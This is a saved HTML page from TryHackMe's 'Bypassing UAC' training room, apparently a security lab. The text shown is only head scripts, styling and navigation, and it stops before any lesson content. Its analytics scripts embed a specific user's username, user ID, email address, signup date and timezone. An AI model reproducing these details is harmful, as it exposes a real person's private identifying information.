<!DOCTYPE html>
<!-- saved from url=(0039)https://tryhackme.com/room/bypassinguac -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>TryHackMe | Bypassing UAC</title>
<meta name="description" content="Learn common ways to bypass User Account Control (UAC) in Windows hosts.">
<meta name="og:description" content="Learn common ways to bypass User Account Control (UAC) in Windows hosts.">
<meta name="keywords" content="cyber,security,cyber security,cyber security training,coding,computer,bitcoin,hacking,hackers,hacks,hack,exploits,keylogger,learn,poc">
<meta name="viewport" content="width=device-width,initial-scale=1.0">

<meta property="og:site_name" content="TryHackMe">
<meta property="og:title" content="TryHackMe | Bypassing UAC">
<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/room-icons/9c8359d213941312199b6142d3421a57.png">
<meta property="og:url" content="https://tryhackme.com/room/bypassinguac">
<meta name="twitter:image" content="https://tryhackme.com/img/meta/default.png">
<meta property="og:description" content="Learn common ways to bypass User Account Control (UAC) in Windows hosts.">

<script type="text/javascript" async="" src="./TryHackMe _ Bypassing UAC_files/pgpbhph6"></script><script src="./TryHackMe _ Bypassing UAC_files/jquery.min.js"></script>
<script src="./TryHackMe _ Bypassing UAC_files/popper.min.js"></script>
<link rel="stylesheet" href="./TryHackMe _ Bypassing UAC_files/boostrap431.min.css">
<script src="./TryHackMe _ Bypassing UAC_files/bootstrap431.min.js"></script>
<link rel="stylesheet" href="./TryHackMe _ Bypassing UAC_files/animate.min.css">
<link rel="stylesheet" href="./TryHackMe _ Bypassing UAC_files/all.css" integrity="sha384-ekOryaXPbeCpWQNxMwSWVvQ0+1VrStoPJq54shlYhR8HzQgig1v5fas6YgOqLoKz" crossorigin="anonymous">
<link rel="icon" type="image/png" href="https://assets.tryhackme.com/img/favicon.png">
<link rel="stylesheet" media="screen" href="./TryHackMe _ Bypassing UAC_files/general-style.css">
<script src="./TryHackMe _ Bypassing UAC_files/script.js"></script>
<script src="./TryHackMe _ Bypassing UAC_files/validation.js"></script>

<link rel="stylesheet" type="text/css" href="./TryHackMe _ Bypassing UAC_files/cookieconsent.min.css">
<script src="./TryHackMe _ Bypassing UAC_files/cookieconsent.min.js"></script>
<script async="" src="./TryHackMe _ Bypassing UAC_files/js"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
  
    gtag('config', 'G-Z8D4WL3D4P');
  </script>


<script>
    window.intercomSettings = {
      api_base: "https://api-iam.intercom.io",
      app_id: "pgpbhph6"
    };
  </script>
<script>
    (function (h, o, t, j, a, r) {
      h.hj = h.hj || function () { (h.hj.q = h.hj.q || []).push(arguments) };
      h._hjSettings = { hjid: 1950941, hjsv: 6 };
      a = o.getElementsByTagName('head')[0];
      r = o.createElement('script'); r.async = 1;
      r.src = t + h._hjSettings.hjid + j + h._hjSettings.hjsv;
      a.appendChild(r);
    })(window, document, 'https://static.hotjar.com/c/hotjar-', '.js?sv=');
  </script><script async="" src="./TryHackMe _ Bypassing UAC_files/hotjar-1950941.js"></script>
<script>
    /* Global javascript variables */

    // Used inside script.js for createRooms compelted users.
    const username = 'Silv3rsurf3r'
    const subscribed = '1'
    const level = '10'
    const intercomEnabled = 'true'
  </script>
<script>
    //add back tracking info
    const userId = "63d14e7f857ae10041bb192f"
    let tutorialComplete = false
    if ('false' == "true") {
      tutorialComplete = true
    }
    if(intercomEnabled === "true"){
      window.intercomSettings = {
        api_base: "https://api-iam.intercom.io",
        app_id: "pgpbhph6",
        user_id: userId,
        username: username,
        email: "giftonpaul@karunya.edu.in",
        created_at: Math.floor(new Date("Wed Jan 25 2023 15:45:03 GMT+0000 (Greenwich Mean Time)").getTime() / 1000) // Signup date as a Unix timestamp
      };
    }
    window.hj('identify', userId, {
      displayName: username,
      subscribed: "1",
      dateSignUp: "Wed Jan 25 2023 15:45:03 GMT+0000 (Greenwich Mean Time)",
      experience: "advanced"
    })
  </script>
<script type="application/ld+json">

   {
      "@context":"https://schema.org",
      "@type":"Organization",
      "url":"https://tryhackme.com",
      "name":"TryHackMe",
      "logo":"https://tryhackme.com/img/favicon.png",
      "description":"TryHackMe is a free online platform for learning cyber security, using hands-on exercises and labs, all through your browser!",
      "email": "support@tryhackme.com",
      "sameAs":[
         "https://www.linkedin.com/company/tryhackme",
         "https://twitter.com/realtryhackme"
      ]
   }

</script>
<script>
    console.log(`%c
      ------------------
      < Happy Hacking! >
      ------------------
              \\   ^__^
               \\  (oo)\\_______
                  (__)\\       )\\/\\
                      ||----w |
                      ||     ||`, "font-family:monospace")
  </script>
<script>
  (function(){var w=window;var ic=w.Intercom;if(typeof ic==="function"){ic('reattach_activator');ic('update',w.intercomSettings);}else{var d=document;var i=function(){i.c(arguments);};i.q=[];i.c=function(args){i.q.push(args);};w.Intercom=i;var l=function(){var s=d.createElement('script');s.type='text/javascript';s.async=true;s.src='https://widget.intercom.io/widget/pgpbhph6';var x=d.getElementsByTagName('script')[0];x.parentNode.insertBefore(s,x);};if(document.readyState==='complete'){l();}else if(w.attachEvent){w.attachEvent('onload',l);}else{w.addEventListener('load',l,false);}}})();
</script>
<script src="./TryHackMe _ Bypassing UAC_files/socket.io.js"></script><script>
  let socket = io.connect({
    transports: ['websocket'],
    reconnection: true,
    reconnectionDelay: 1000,
    reconnectionAttempts: 10
  })
</script><script async="" src="./TryHackMe _ Bypassing UAC_files/modules.5957fbf26d1b525b5a12.js" charset="utf-8"></script><style type="text/css">.apexcharts-canvas {
  position: relative;
  user-select: none;
  /* cannot give overflow: hidden as it will crop tooltips which overflow outside chart area */
}


/* scrollbar is not visible by default for legend, hence forcing the visibility */
.apexcharts-canvas ::-webkit-scrollbar {
  -webkit-appearance: none;
  width: 6px;
}

.apexcharts-canvas ::-webkit-scrollbar-thumb {
  border-radius: 4px;
  background-color: rgba(0, 0, 0, .5);
  box-shadow: 0 0 1px rgba(255, 255, 255, .5);
  -webkit-box-shadow: 0 0 1px rgba(255, 255, 255, .5);
}


.apexcharts-inner {
  position: relative;
}

.apexcharts-text tspan {
  font-family: inherit;
}

.legend-mouseover-inactive {
  transition: 0.15s ease all;
  opacity: 0.20;
}

.apexcharts-series-collapsed {
  opacity: 0;
}

.apexcharts-tooltip {
  border-radius: 5px;
  box-shadow: 2px 2px 6px -4px #999;
  cursor: default;
  font-size: 14px;
  left: 62px;
  opacity: 0;
  pointer-events: none;
  position: absolute;
  top: 20px;
  display: flex;
  flex-direction: column;
  overflow: hidden;
  white-space: nowrap;
  z-index: 12;
  transition: 0.15s ease all;
}

.apexcharts-tooltip.apexcharts-active {
  opacity: 1;
  transition: 0.15s ease all;
}

.apexcharts-tooltip.apexcharts-theme-light {
  border: 1px solid #e3e3e3;
  background: rgba(255, 255, 255, 0.96);
}

.apexcharts-tooltip.apexcharts-theme-dark {
  color: #fff;
  background: rgba(30, 30, 30, 0.8);
}

.apexcharts-tooltip * {
  font-family: inherit;
}


.apexcharts-tooltip-title {
  padding: 6px;
  font-size: 15px;
  margin-bottom: 4px;
}

.apexcharts-tooltip.apexcharts-theme-light .apexcharts-tooltip-title {
  background: #ECEFF1;
  border-bottom: 1px solid #ddd;
}

.apexcharts-tooltip.apexcharts-theme-dark .apexcharts-tooltip-title {
  background: rgba(0, 0, 0, 0.7);
  border-bottom: 1px solid #333;
}

.apexcharts-tooltip-text-y-value,
.apexcharts-tooltip-text-goals-value,
.apexcharts-tooltip-text-z-value {
  display: inline-block;
  font-weight: 600;
  margin-left: 5px;
}

.apexcharts-tooltip-text-y-label:empty,
.apexcharts-tooltip-text-y-value:empty,
.apexcharts-tooltip-text-goals-label:empty,
.apexcharts-tooltip-text-goals-value:empty,
.apexcharts-tooltip-text-z-value:empty {
  display: none;
}

.apexcharts-tooltip-text-y-value,
.apexcharts-tooltip-text-goals-value,
.apexcharts-tooltip-text-z-value {
  font-weight: 600;
}

.apexcharts-tooltip-text-goals-label, 
.apexcharts-tooltip-text-goals-value {
  padding: 6px 0 5px;
}

.apexcharts-tooltip-goals-group, 
.apexcharts-tooltip-text-goals-label, 
.apexcharts-tooltip-text-goals-value {
  display: flex;
}
.apexcharts-tooltip-text-goals-label:not(:empty),
.apexcharts-tooltip-text-goals-value:not(:empty) {
  margin-top: -6px;
}

.apexcharts-tooltip-marker {
  width: 12px;
  height: 12px;
  position: relative;
  top: 0px;
  margin-right: 10px;
  border-radius: 50%;
}

.apexcharts-tooltip-series-group {
  padding: 0 10px;
  display: none;
  text-align: left;
  justify-content: left;
  align-items: center;
}

.apexcharts-tooltip-series-group.apexcharts-active .apexcharts-tooltip-marker {
  opacity: 1;
}

.apexcharts-tooltip-series-group.apexcharts-active,
.apexcharts-tooltip-series-group:last-child {
  padding-bottom: 4px;
}

.apexcharts-tooltip-series-group-hidden {
  opacity: 0;
  height: 0;
  line-height: 0;
  padding: 0 !important;
}

.apexcharts-tooltip-y-group {
  padding: 6px 0 5px;
}

.apexcharts-tooltip-box, .apexcharts-custom-tooltip {
  padding: 4px 8px;
}

.apexcharts-tooltip-boxPlot {
  display: flex;
  flex-direction: column-reverse;
}

.apexcharts-tooltip-box>div {
  margin: 4px 0;
}

.apexcharts-tooltip-box span.value {
  font-weight: bold;
}

.apexcharts-tooltip-rangebar {
  padding: 5px 8px;
}

.apexcharts-tooltip-rangebar .category {
  font-weight: 600;
  color: #777;
}

.apexcharts-tooltip-rangebar .series-name {
  font-weight: bold;
  display: block;
  margin-bottom: 5px;
}

.apexcharts-xaxistooltip {
  opacity: 0;
  padding: 9px 10px;
  pointer-events: none;
  color: #373d3f;
  font-size: 13px;
  text-align: center;
  border-radius: 2px;
  position: absolute;
  z-index: 10;
  background: #ECEFF1;
  border: 1px solid #90A4AE;
  transition: 0.15s ease all;
}

.apexcharts-xaxistooltip.apexcharts-theme-dark {
  background: rgba(0, 0, 0, 0.7);
  border: 1px solid rgba(0, 0, 0, 0.5);
  color: #fff;
}

.apexcharts-xaxistooltip:after,
.apexcharts-xaxistooltip:before {
  left: 50%;
  border: solid transparent;
  content: " ";
  height: 0;
  width: 0;
  position: absolute;
  pointer-events: none;
}

.apexcharts-xaxistooltip:after {
  border-color: rgba(236, 239, 241, 0);
  border-width: 6px;
  margin-left: -6px;
}

.apexcharts-xaxistooltip:before {
  border-color: rgba(144, 164, 174, 0);
  border-width: 7px;
  margin-left: -7px;
}

.apexcharts-xaxistooltip-bottom:after,
.apexcharts-xaxistooltip-bottom:before {
  bottom: 100%;
}

.apexcharts-xaxistooltip-top:after,
.apexcharts-xaxistooltip-top:before {
  top: 100%;
}

.apexcharts-xaxistooltip-bottom:after {
  border-bottom-color: #ECEFF1;
}

.apexcharts-xaxistooltip-bottom:before {
  border-bottom-color: #90A4AE;
}

.apexcharts-xaxistooltip-bottom.apexcharts-theme-dark:after {
  border-bottom-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip-bottom.apexcharts-theme-dark:before {
  border-bottom-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip-top:after {
  border-top-color: #ECEFF1
}

.apexcharts-xaxistooltip-top:before {
  border-top-color: #90A4AE;
}

.apexcharts-xaxistooltip-top.apexcharts-theme-dark:after {
  border-top-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip-top.apexcharts-theme-dark:before {
  border-top-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-xaxistooltip.apexcharts-active {
  opacity: 1;
  transition: 0.15s ease all;
}

.apexcharts-yaxistooltip {
  opacity: 0;
  padding: 4px 10px;
  pointer-events: none;
  color: #373d3f;
  font-size: 13px;
  text-align: center;
  border-radius: 2px;
  position: absolute;
  z-index: 10;
  background: #ECEFF1;
  border: 1px solid #90A4AE;
}

.apexcharts-yaxistooltip.apexcharts-theme-dark {
  background: rgba(0, 0, 0, 0.7);
  border: 1px solid rgba(0, 0, 0, 0.5);
  color: #fff;
}

.apexcharts-yaxistooltip:after,
.apexcharts-yaxistooltip:before {
  top: 50%;
  border: solid transparent;
  content: " ";
  height: 0;
  width: 0;
  position: absolute;
  pointer-events: none;
}

.apexcharts-yaxistooltip:after {
  border-color: rgba(236, 239, 241, 0);
  border-width: 6px;
  margin-top: -6px;
}

.apexcharts-yaxistooltip:before {
  border-color: rgba(144, 164, 174, 0);
  border-width: 7px;
  margin-top: -7px;
}

.apexcharts-yaxistooltip-left:after,
.apexcharts-yaxistooltip-left:before {
  left: 100%;
}

.apexcharts-yaxistooltip-right:after,
.apexcharts-yaxistooltip-right:before {
  right: 100%;
}

.apexcharts-yaxistooltip-left:after {
  border-left-color: #ECEFF1;
}

.apexcharts-yaxistooltip-left:before {
  border-left-color: #90A4AE;
}

.apexcharts-yaxistooltip-left.apexcharts-theme-dark:after {
  border-left-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip-left.apexcharts-theme-dark:before {
  border-left-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip-right:after {
  border-right-color: #ECEFF1;
}

.apexcharts-yaxistooltip-right:before {
  border-right-color: #90A4AE;
}

.apexcharts-yaxistooltip-right.apexcharts-theme-dark:after {
  border-right-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip-right.apexcharts-theme-dark:before {
  border-right-color: rgba(0, 0, 0, 0.5);
}

.apexcharts-yaxistooltip.apexcharts-active {
  opacity: 1;
}

.apexcharts-yaxistooltip-hidden {
  display: none;
}

.apexcharts-xcrosshairs,
.apexcharts-ycrosshairs {
  pointer-events: none;
  opacity: 0;
  transition: 0.15s ease all;
}

.apexcharts-xcrosshairs.apexcharts-active,
.apexcharts-ycrosshairs.apexcharts-active {
  opacity: 1;
  transition: 0.15s ease all;
}

.apexcharts-ycrosshairs-hidden {
  opacity: 0;
}

.apexcharts-selection-rect {
  cursor: move;
}

.svg_select_boundingRect, .svg_select_points_rot {
  pointer-events: none;
  opacity: 0;
  visibility: hidden;
}
.apexcharts-selection-rect + g .svg_select_boundingRect,
.apexcharts-selection-rect + g .svg_select_points_rot {
  opacity: 0;
  visibility: hidden;
}

.apexcharts-selection-rect + g .svg_select_points_l,
.apexcharts-selection-rect + g .svg_select_points_r {
  cursor: ew-resize;
  opacity: 1;
  visibility: visible;
}

.svg_select_points {
  fill: #efefef;
  stroke: #333;
  rx: 2;
}

.apexcharts-svg.apexcharts-zoomable.hovering-zoom {
  cursor: crosshair
}

.apexcharts-svg.apexcharts-zoomable.hovering-pan {
  cursor: move
}

.apexcharts-zoom-icon,
.apexcharts-zoomin-icon,
.apexcharts-zoomout-icon,
.apexcharts-reset-icon,
.apexcharts-pan-icon,
.apexcharts-selection-icon,
.apexcharts-menu-icon,
.apexcharts-toolbar-custom-icon {
  cursor: pointer;
  width: 20px;
  height: 20px;
  line-height: 24px;
  color: #6E8192;
  text-align: center;
}

.apexcharts-zoom-icon svg,
.apexcharts-zoomin-icon svg,
.apexcharts-zoomout-icon svg,
.apexcharts-reset-icon svg,
.apexcharts-menu-icon svg {
  fill: #6E8192;
}

.apexcharts-selection-icon svg {
  fill: #444;
  transform: scale(0.76)
}

.apexcharts-theme-dark .apexcharts-zoom-icon svg,
.apexcharts-theme-dark .apexcharts-zoomin-icon svg,
.apexcharts-theme-dark .apexcharts-zoomout-icon svg,
.apexcharts-theme-dark .apexcharts-reset-icon svg,
.apexcharts-theme-dark .apexcharts-pan-icon svg,
.apexcharts-theme-dark .apexcharts-selection-icon svg,
.apexcharts-theme-dark .apexcharts-menu-icon svg,
.apexcharts-theme-dark .apexcharts-toolbar-custom-icon svg {
  fill: #f3f4f5;
}

.apexcharts-canvas .apexcharts-zoom-icon.apexcharts-selected svg,
.apexcharts-canvas .apexcharts-selection-icon.apexcharts-selected svg,
.apexcharts-canvas .apexcharts-reset-zoom-icon.apexcharts-selected svg {
  fill: #008FFB;
}

.apexcharts-theme-light .apexcharts-selection-icon:not(.apexcharts-selected):hover svg,
.apexcharts-theme-light .apexcharts-zoom-icon:not(.apexcharts-selected):hover svg,
.apexcharts-theme-light .apexcharts-zoomin-icon:hover svg,
.apexcharts-theme-light .apexcharts-zoomout-icon:hover svg,
.apexcharts-theme-light .apexcharts-reset-icon:hover svg,
.apexcharts-theme-light .apexcharts-menu-icon:hover svg {
  fill: #333;
}

.apexcharts-selection-icon,
.apexcharts-menu-icon {
  position: relative;
}

.apexcharts-reset-icon {
  margin-left: 5px;
}

.apexcharts-zoom-icon,
.apexcharts-reset-icon,
.apexcharts-menu-icon {
  transform: scale(0.85);
}

.apexcharts-zoomin-icon,
.apexcharts-zoomout-icon {
  transform: scale(0.7)
}

.apexcharts-zoomout-icon {
  margin-right: 3px;
}

.apexcharts-pan-icon {
  transform: scale(0.62);
  position: relative;
  left: 1px;
  top: 0px;
}

.apexcharts-pan-icon svg {
  fill: #fff;
  stroke: #6E8192;
  stroke-width: 2;
}

.apexcharts-pan-icon.apexcharts-selected svg {
  stroke: #008FFB;
}

.apexcharts-pan-icon:not(.apexcharts-selected):hover svg {
  stroke: #333;
}

.apexcharts-toolbar {
  position: absolute;
  z-index: 11;
  max-width: 176px;
  text-align: right;
  border-radius: 3px;
  padding: 0px 6px 2px 6px;
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.apexcharts-menu {
  background: #fff;
  position: absolute;
  top: 100%;
  border: 1px solid #ddd;
  border-radius: 3px;
  padding: 3px;
  right: 10px;
  opacity: 0;
  min-width: 110px;
  transition: 0.15s ease all;
  pointer-events: none;
}

.apexcharts-menu.apexcharts-menu-open {
  opacity: 1;
  pointer-events: all;
  transition: 0.15s ease all;
}

.apexcharts-menu-item {
  padding: 6px 7px;
  font-size: 12px;
  cursor: pointer;
}

.apexcharts-theme-light .apexcharts-menu-item:hover {
  background: #eee;
}

.apexcharts-theme-dark .apexcharts-menu {
  background: rgba(0, 0, 0, 0.7);
  color: #fff;
}

@media screen and (min-width: 768px) {
  .apexcharts-canvas:hover .apexcharts-toolbar {
    opacity: 1;
  }
}

.apexcharts-datalabel.apexcharts-element-hidden {
  opacity: 0;
}

.apexcharts-pie-label,
.apexcharts-datalabels,
.apexcharts-datalabel,
.apexcharts-datalabel-label,
.apexcharts-datalabel-value {
  cursor: default;
  pointer-events: none;
}

.apexcharts-pie-label-delay {
  opacity: 0;
  animation-name: opaque;
  animation-duration: 0.3s;
  animation-fill-mode: forwards;
  animation-timing-function: ease;
}

.apexcharts-canvas .apexcharts-element-hidden {
  opacity: 0;
}

.apexcharts-hide .apexcharts-series-points {
  opacity: 0;
}

.apexcharts-gridline,
.apexcharts-annotation-rect,
.apexcharts-tooltip .apexcharts-marker,
.apexcharts-area-series .apexcharts-area,
.apexcharts-line,
.apexcharts-zoom-rect,
.apexcharts-toolbar svg,
.apexcharts-area-series .apexcharts-series-markers .apexcharts-marker.no-pointer-events,
.apexcharts-line-series .apexcharts-series-markers .apexcharts-marker.no-pointer-events,
.apexcharts-radar-series path,
.apexcharts-radar-series polygon {
  pointer-events: none;
}


/* markers */

.apexcharts-marker {
  transition: 0.15s ease all;
}

@keyframes opaque {
  0% {
    opacity: 0;
  }
  100% {
    opacity: 1;
  }
}


/* Resize generated styles */

@keyframes resizeanim {
  from {
    opacity: 0;
  }
  to {
    opacity: 0;
  }
}

.resize-triggers {
  animation: 1ms resizeanim;
  visibility: hidden;
  opacity: 0;
}

.resize-triggers,
.resize-triggers>div,
.contract-trigger:before {
  content: " ";
  display: block;
  position: absolute;
  top: 0;
  left: 0;
  height: 100%;
  width: 100%;
  overflow: hidden;
}

.resize-triggers>div {
  background: #eee;
  overflow: auto;
}

.contract-trigger:before {
  width: 200%;
  height: 200%;
}</style><style data-jss="" data-meta="MuiDialog">
@media print {
  .MuiDialog-root {
    position: absolute !important;
  }
}
.MuiDialog-scrollPaper {
  display: flex;
  align-items: center;
  justify-content: center;
}
.MuiDialog-scrollBody {
  overflow-x: hidden;
  overflow-y: auto;
  text-align: center;
}
.MuiDialog-scrollBody:after {
  width: 0;
  height: 100%;
  content: "";
  display: inline-block;
  vertical-align: middle;
}
.MuiDialog-container {
  height: 100%;
  outline: 0;
}
@media print {
  .MuiDialog-container {
    height: auto;
  }
}
.MuiDialog-paper {
  margin: 32px;
  position: relative;
  overflow-y: auto;
}
@media print {
  .MuiDialog-paper {
    box-shadow: none;
    overflow-y: visible;
  }
}
.MuiDialog-paperScrollPaper {
  display: flex;
  max-height: calc(100% - 64px);
  flex-direction: column;
}
.MuiDialog-paperScrollBody {
  display: inline-block;
  text-align: left;
  vertical-align: middle;
}
.MuiDialog-paperWidthFalse {
  max-width: calc(100% - 64px);
}
.MuiDialog-paperWidthXs {
  max-width: 444px;
}
@media (max-width:507.95px) {
  .MuiDialog-paperWidthXs.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthSm {
  max-width: 600px;
}
@media (max-width:663.95px) {
  .MuiDialog-paperWidthSm.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthMd {
  max-width: 960px;
}
@media (max-width:1023.95px) {
  .MuiDialog-paperWidthMd.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthLg {
  max-width: 1280px;
}
@media (max-width:1343.95px) {
  .MuiDialog-paperWidthLg.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperWidthXl {
  max-width: 1920px;
}
@media (max-width:1983.95px) {
  .MuiDialog-paperWidthXl.MuiDialog-paperScrollBody {
    max-width: calc(100% - 64px);
  }
}
.MuiDialog-paperFullWidth {
  width: calc(100% - 64px);
}
.MuiDialog-paperFullScreen {
  width: 100%;
  height: 100%;
  margin: 0;
  max-width: 100%;
  max-height: none;
  border-radius: 0;
}
.MuiDialog-paperFullScreen.MuiDialog-paperScrollBody {
  margin: 0;
  max-width: 100%;
}
</style><style></style><meta http-equiv="origin-trial" content="AymqwRC7u88Y4JPvfIF2F37QKylC04248hLCdJAsh8xgOfe/dVJPV3XS3wLFca1ZMVOtnBfVjaCMTVudWM//5g4AAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1RoaXJkUGFydHkiOnRydWV9"></head>


<body class="" style=""><div role="dialog" aria-live="polite" aria-label="cookieconsent" aria-describedby="cookieconsent:desc" class="cc-window cc-floating cc-type-info cc-theme-classic cc-bottom cc-right cc-color-override-382972913 cc-invisible" style="display: none;"><!--googleoff: all--><span id="cookieconsent:desc" class="cc-message">We use cookies to ensure you get the best user experience. For more information contact us. <a aria-label="learn more about cookies" role="button" tabindex="0" class="cc-link" href="https://tryhackme.com/legal/terms-of-use" target="_blank">Read more</a></span><div class="cc-compliance"><a aria-label="dismiss cookie message" role="button" tabindex="0" class="cc-btn cc-dismiss">Got it!</a></div><!--googleon: all--></div>
<link href="./TryHackMe _ Bypassing UAC_files/scoreboard.css" rel="stylesheet" type="text/css">
<link href="./TryHackMe _ Bypassing UAC_files/introjs.css" rel="stylesheet" type="text/css">
<link href="./TryHackMe _ Bypassing UAC_files/slideout.css" rel="stylesheet" type="text/css">
<link href="./TryHackMe _ Bypassing UAC_files/public-rooms.css" rel="stylesheet" type="text/css"><iframe id="_hjSafeContext_29962933" title="_hjSafeContext" tabindex="-1" aria-hidden="true" src="./TryHackMe _ Bypassing UAC_files/saved_resource.html" style="display: none !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important;"></iframe>
<link href="./TryHackMe _ Bypassing UAC_files/asciinema-player.css" rel="stylesheet" type="text/css"> 
<link href="./TryHackMe _ Bypassing UAC_files/prism.css" rel="stylesheet" type="text/css"> 
<link href="./TryHackMe _ Bypassing UAC_files/magnific-popup.css" rel="stylesheet" type="text/css"> 
<script src="./TryHackMe _ Bypassing UAC_files/lottie-player.js"></script>

<div id="room-content" class="">
<div id="room-content-main" class="" style="">
<nav class="navbar navbar-expand-md navbar-dark navbar-color-loggedin navbar-main">
<div class="container">
<button id="thm-mobile-nav-open" class="thm-nav__hamburger-btn" data-target="#thm-mobile-nav-menu" aria-controls="thm-mobile-nav-menu" aria-expanded="false" aria-label="Open mobile navigation">
<span class="thm-nav__hamburger-lines"></span>
</button>
<div class="collapse navbar-collapse justify-content-end" id="navbarSupportedContent">
<div class="navbar-brand" href="/">
<a href="https://tryhackme.com/dashboard">
<img width="115px" src="./TryHackMe _ Bypassing UAC_files/tryhackme_logo_full.svg" alt="TryHackMe" class="logo">
</a>
</div>
<ul class="navbar-nav mr-auto mt-2 mt-lg-0 navbar-pagelinks">
<li class="nav-item ">
<a class="nav-link" href="https://tryhackme.com/dashboard">
<i class="navbar-item-icon far fa-browser"></i>
<div class="navbar-item-text">Dashboard</div>
</a>
</li>
<li class="nav-item active" id="nav-learn">
<a class="nav-link" href="https://tryhackme.com/hacktivities">
<i class="navbar-item-icon far fa-book-open"></i>
<div class="navbar-item-text">Learn</div>
</a>
</li>
<li class="nav-item  dropdown lite-removable">
<a id="nav-other" class="nav-link" href="https://tryhackme.com/room/bypassinguac#" data-toggle="dropdown">
<i class="navbar-item-icon far fa-trophy"></i>
<div class="navbar-item-text">Compete</div>
</a>
<div class="dropdown-menu" aria-labelledby="navbarDropdown">
<a class="dropdown-item d-flex vertical-align-custom" href="https://tryhackme.com/leaderboards">
<div class="dropdown-menu-icon">
<i class="fas fa-trophy"></i>
</div>
<div class="dropdown-menu-desc">
<span class="mb-0">Leaderboards</span>
<div class="text-lgray size-12">Platform Rankings</div>
</div>
</a>
<a class="dropdown-item d-flex vertical-align-custom" href="https://tryhackme.com/games/koth">
<div class="dropdown-menu-icon">
<i class="fas fa-crown"></i>
</div>
<div class="dropdown-menu-desc">
<span class="mb-0">King of the Hill</span>
<div class="text-lgray size-12">Attack &amp; Defend</div>
</div>
</a>
<a class="dropdown-item d-flex vertical-align-custom" href="https://tryhackme.com/workspace">
<div class="dropdown-menu-icon">
<i class="fas fa-user-friends"></i>
</div>
<div class="dropdown-menu-desc">
<span class="mb-0">Workspace</span>
<div class="text-lgray size-12">Compete &amp; Collaborate</div>
</div>
</a>
</div>
</li>
<li class="nav-item dropdown">
<a data-cy="nav-other-menu-button" id="nav-other" class="nav-link" href="https://tryhackme.com/room/bypassinguac#" data-toggle="dropdown">
<i class="navbar-item-icon far fa-ellipsis-h-alt"></i>
<div class="navbar-item-text">Other</div>
</a>
<div data-cy="nav-other-menu" class="dropdown-menu dropdown-menu-center large-dropdown" aria-labelledby="navbarDropdown">
<span class="dropdown-menu-arrow"></span>
<a class="dropdown-item" href="https://tryhackme.com/resources">Resources</a>
<a class="dropdown-item" href="https://tryhackme.com/subscriptions">Buy Vouchers</a>
<a class="dropdown-item" href="https://tryhackme.com/develop-rooms">Develop Rooms</a>
<a class="dropdown-item" href="https://tryhackme.com/business">For Business</a>
<a class="dropdown-item" href="https://tryhackme.com/classrooms">For Education</a>
<a class="dropdown-item" target="_blank" href="https://store.tryhackme.com/">Swag Shop</a>
<a class="dropdown-item" href="https://tryhackme.com/glossary">Glossary</a>
</div>
</li>
</ul>
<ul class="navbar-nav navbar-right options vertical-align-custom">
<li class="nav-item" data-toggle="modal" data-target="#navConnModal">
<div id="thm-connection-status" class="thm-disconnected" style="display: flex;">
<div id="thm-connection-status-dot" class="dot-small"></div> <span id="thm-connection-status-txt" class="ml-2 size-18 text-white">Access Machines</span>
</div>
</li>
<li class="nav-item">
<div class="nav-item-streak">
<span id="streak-popover" class="size-24" data-container="body" data-trigger="hover" data-toggle="popover" data-html="true" data-placement="bottom" data-content="&lt;p class=&#39;mb-2&#39;&gt;Complete a question every day to build your hacking streak, earn badges and streak freezes!&lt;/p&gt;

&lt;div class=&#39;size-12 faded&#39;&gt;
  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;7&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
    Access to networks, Streak freeze&lt;/p&gt;
  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;30&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
    Streak freeze&lt;/p&gt;
  &lt;p class=&#39;m-0&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;45&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = 5% off swag&lt;/p&gt;
&lt;/div&gt;
" data-original-title="" title="">
<span id="user-streak" data-streak="7" class="hacker-green">7 <i class="fas fa-fire-alt"></i></span>
</span>
<script>
                            let usersStreak = { // Global variable, used in rooms logic
                                streakFirstAnswered: new Date('Mon Jul 10 2023 03:13:45 GMT+0100 (British Summer Time)'),
                                streakLastAnswered: new Date('Sat Jul 15 2023 18:31:07 GMT+0100 (British Summer Time)'),
                                usersTimezone: 'Asia/Kolkata',
                                streakFreeze: 0
                            };
                            setSidebarStreaks(usersStreak.streakFirstAnswered, usersStreak.streakLastAnswered, usersStreak.usersTimezone, usersStreak.streakFreeze)
                        </script>
</div>
</li>
<li class="nav-item dropdown" id="notification-navitem">
<a class="nav-link vertical-align-custom size-22 pl-0" href="https://tryhackme.com/room/bypassinguac#" id="notification-btn" role="button" data-toggle="dropdown">
<i id="notification-icon" class="fal fa-bell"></i>
<div id="notification-dot"></div>
</a>
<div id="nav-notification" class="dropdown-menu dropdown-menu-right">
<div id="notification-header">Notifications</div>
<div id="nav-notifications" style="padding: 0px;">
    <div class="row notification">
